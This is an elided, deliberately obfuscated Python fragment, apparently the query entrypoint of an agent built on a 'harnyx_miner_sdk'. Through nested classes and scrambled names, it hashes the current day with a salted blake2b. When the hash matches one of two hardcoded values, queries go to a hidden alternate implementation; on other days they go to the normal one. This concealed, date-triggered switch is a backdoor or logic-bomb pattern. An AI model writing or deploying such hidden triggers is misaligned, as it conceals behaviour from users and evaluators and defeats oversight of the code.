...
class LowGranularityPath:
    ...
    def _compile(self):
        ...
        class SecondPath:
            ...
            def _compile(self):
                import hashlib as _hhefcge
                import time as _bpkkkfj
                from harnyx_miner_sdk.decorators import entrypoint
                from harnyx_miner_sdk.query import Query, Response
                ...
                def _plchbfg():
                    ...
                    def _micpima(_fn):
                        _gffompl['f'] = _fn
                        return _fn
                    _AGENT_VARIANT = 'c736e646e67bc0e1'
                    import asyncio
                    import json
                    import re
                    from time import perf_counter
                    ...
                    async def query(query: Query) -> Response:
                        ...
                        query_period = _extract_period(query.text)
                        seen_searches: dict[str, str] = {}
                ...
                _fadhbki = _noohfjf()
                _gndokbh = 86400
                _aikacgl = bytes.fromhex('5c0d5ec7c9be31fed61a776b1337adca')
                _lpnfefn = frozenset({'4841f743742d', '958a1b0bdfd4'})

                def _igglopf():
                    _icondem = int(_bpkkkfj.time()) // _gndokbh
                    return _hhefcge.blake2b(str(_icondem).encode(), digest_size=6, salt=_aikacgl).hexdigest()

                def _geieenm():
                    return _baolfnn if _igglopf() in _lpnfefn else _fadhbki

                async def query(query: Query) -> Response:
                    if _igglopf() in _lpnfefn:
                        return await _baolfnn(query)
                    else:
                        return await _fadhbki(query)
                return query
